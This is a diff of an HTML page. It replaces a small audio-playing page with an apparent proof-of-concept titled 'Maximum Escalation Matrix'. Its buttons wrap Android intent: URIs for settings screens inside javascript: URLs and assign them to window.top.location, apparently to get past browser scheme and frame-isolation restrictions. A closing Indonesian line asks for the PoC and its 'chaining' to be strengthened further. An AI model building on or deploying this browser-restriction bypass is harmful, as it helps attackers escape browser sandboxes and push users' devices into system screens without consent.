@@ -1,63 +1,151 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>Audio Stabil</title>
-
-<style>
-body{
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    height:100vh;
-    background:#111;
-}
-
-button{
-    padding:20px 40px;
-    font-size:20px;
-    border-radius:12px;
-    cursor:pointer;
-}
-
-.putar{
-    animation: putar 1s linear infinite;
-}
-
-@keyframes putar{
-    from{transform:rotate(0deg);}
-    to{transform:rotate(360deg);}
-}
-
-audio{
-    display:none;
-}
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Intent Navigation Test (Maximum Escalation Matrix)</title>
+  <style>
+    body {
+      font-family: monospace;
+      padding: 20px;
+      background-color: #ffffff;
+      color: #000000;
+      line-height: 1.5;
+    }
+    .grid-container {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+      gap: 15px;
+      margin-top: 20px;
+    }
+    .card {
+      border: 1px solid #000000;
+      padding: 15px;
+      background-color: #f9f9f9;
+    }
+    .card h3 {
+      margin-top: 0;
+      border-bottom: 1px solid #000000;
+      padding-bottom: 5px;
+    }
+    button {
+      padding: 8px 15px;
+      font-family: monospace;
+      cursor: pointer;
+      width: 100%;
+      background-color: #ffffff;
+      border: 1px solid #000000;
+      text-align: left;
+    }
+    button:hover {
+      background-color: #e0e0e0;
+    }
+    .log-box {
+      margin-top: 30px;
+      padding: 10px;
+      background-color: #f0f0f0;
+      border: 1px dashed #000000;
+      max-height: 180px;
+      overflow-y: auto;
+    }
+  </style>
 </head>
 <body>
 
-<button id="btn" onclick="mulai()">
-    Klik Saya
-</button>
+  <h1>Android Settings Intent Verification Matrix (Max Escalation)</h1>
+  <p>Matriks pengujian komprehensif menggunakan kombinasi struktur tautan berlapis (Nested Context Assignment) untuk memverifikasi ketahanan pembatasan skema pada komponen peramban.</p>
 
-<audio id="audio" src="audio.mp3" loop></audio>
+  <div id="consoleLog" class="log-box">Console output initialized...</div>
 
-<script>
-function mulai(){
+  <div class="grid-container">
 
-    document.getElementById("btn").classList.add("putar");
+    <!-- Jaringan & Konektivitas -->
+    <div class="card">
+      <h3>Konektivitas & Nirkabel</h3>
+      <button onclick="executeChainedIntent('android.settings.SETTINGS')">1. Main Settings</button><br><br>
+      <button onclick="executeChainedIntent('android.settings.WIRELESS_SETTINGS')">2. Wireless / Network</button><br><br>
+      <button onclick="executeChainedIntent('android.settings.WIFI_SETTINGS')">3. Wi-Fi Settings</button><br><br>
+      <button onclick="executeChainedIntent('android.settings.BLUETOOTH_SETTINGS')">4. Bluetooth Settings</button><br><br>
+      <button onclick="executeChainedIntent('android.settings.NFC_SETTINGS')">5. NFC Settings</button><br><br>
+      <button onclick="executeChainedIntent('android.settings.AIRPLANE_MODE_SETTINGS')">6. Airplane Mode</button>
+    </div>
 
-    const audio = document.getElementById("audio");
-    audio.play();
+    <!-- Aplikasi & Notifikasi -->
+    <div class="card">
+      <h3>Manajemen Aplikasi</h3>
+      <button onclick="executeChainedIntent('android.settings.APPLICATION_SETTINGS')">1. Application Manager</button><br><br>
+      <button onclick="executeChainedIntent('android.settings.MANAGE_ALL_APPLICATIONS_SETTINGS')">2. Manage All Apps</button><br><br>
+      <button onclick="executeChainedIntent('android.settings.NOTIFICATION_SETTINGS')">3. Notification Settings</button><br><br>
+      <button onclick="executeChainedIntent('android.settings.USAGE_ACCESS_SETTINGS')">4. Usage Access Apps</button>
+    </div>
 
-    history.pushState({}, "", "/redirected");
+    <!-- Privasi & Keamanan -->
+    <div class="card">
+      <h3>Privasi & Keamanan</h3>
+      <button onclick="executeChainedIntent('android.settings.SECURITY_SETTINGS')">1. Security Settings</button><br><br>
+      <button onclick="executeChainedIntent('android.settings.LOCATION_SOURCE_SETTINGS')">2. Location Settings</button><br><br>
+      <button onclick="executeChainedIntent('android.settings.PRIVACY_SETTINGS')">3. Privacy Settings</button><br><br>
+      <button onclick="executeChainedIntent('android.settings.BIOMETRIC_ENROLL')">4. Biometric / PIN</button>
+    </div>
 
-    // Google dibuka di tab baru
-    window.open("https://apple.com", "_blank");
+    <!-- Tampilan & Suara -->
+    <div class="card">
+      <h3>Antarmuka & Hardware</h3>
+      <button onclick="executeChainedIntent('android.settings.DISPLAY_SETTINGS')">1. Display Settings</button><br><br>
+      <button onclick="executeChainedIntent('android.settings.SOUND_SETTINGS')">2. Sound & Vibration</button><br><br>
+      <button onclick="executeChainedIntent('android.settings.ACCESSIBILITY_SETTINGS')">3. Accessibility</button>
+    </div>
 
-    // halaman ini tetap hidup → audio tetap jalan
-}
-</script>
+    <!-- Penyimpanan & Sistem -->
+    <div class="card">
+      <h3>Sistem & Penyimpanan</h3>
+      <button onclick="executeChainedIntent('android.settings.INTERNAL_STORAGE_SETTINGS')">1. Storage Settings</button><br><br>
+      <button onclick="executeChainedIntent('android.settings.DATE_SETTINGS')">2. Date & Time</button><br><br>
+      <button onclick="executeChainedIntent('android.settings.LOCALE_SETTINGS')">3. Language & Input</button><br><br>
+      <button onclick="executeChainedIntent('android.settings.DEVICE_INFO_SETTINGS')">4. About Phone</button>
+    </div>
+
+    <!-- Spesifik & Pengembang -->
+    <div class="card">
+      <h3>Spesifik & Pengembang</h3>
+      <button onclick="executeChainedIntent('android.settings.APPLICATION_DEVELOPMENT_SETTINGS')">1. Developer Options</button><br><br>
+      <button onclick="executeChainedIntent('android.settings.BATTERY_SAVER_SETTINGS')">2. Battery Optimizer</button><br><br>
+      <button onclick="executeChainedIntent('android.settings.CAST_SETTINGS')">3. Cast Screen</button>
+    </div>
+
+  </div>
+
+  <script>
+    function logMessage(msg) {
+      const logger = document.getElementById('consoleLog');
+      logger.innerHTML += "<br>[" + new Date().toLocaleTimeString() + "] " + msg;
+      logger.scrollTop = logger.scrollHeight;
+    }
+
+    function executeChainedIntent(actionString) {
+      // 1. Konstruksi URI Intent dasar dengan parameter standar
+      const targetIntent = "intent:#Intent;" +
+                           "action=" + actionString + ";" +
+                           "category=android.intent.category.DEFAULT;" +
+                           "end";
+      
+      // 2. Eskalasi penyeragaman konteks eksekusi melalui pseudo-skema javascript:
+      // guna mengevaluasi ketahanan batas isolasi window.top saat memproses mutasi lokasi objek
+      const escalatedPayload = "javascript:window.top.location='" + targetIntent + "';";
+      
+      logMessage("Menguji rantai eskalasi untuk aksi: " + actionString);
+      
+      try {
+        // 3. Eksekusi pengalihan menggunakan pemanggilan hirarki tertinggi (top-level browsing context)
+        window.top.location.href = escalatedPayload;
+        logMessage("[DISPATCHED] Perintah navigasi ditransmisikan ke parser.");
+      } catch (e) {
+        logMessage("[BLOCKED] Eksekusi ditolak oleh runtime browser: " + e.message);
+      }
+    }
+  </script>
 
 </body>
 </html>
+
+full kuatkan tanpa merusak function poc diatass dan kuatkann full chainingggg
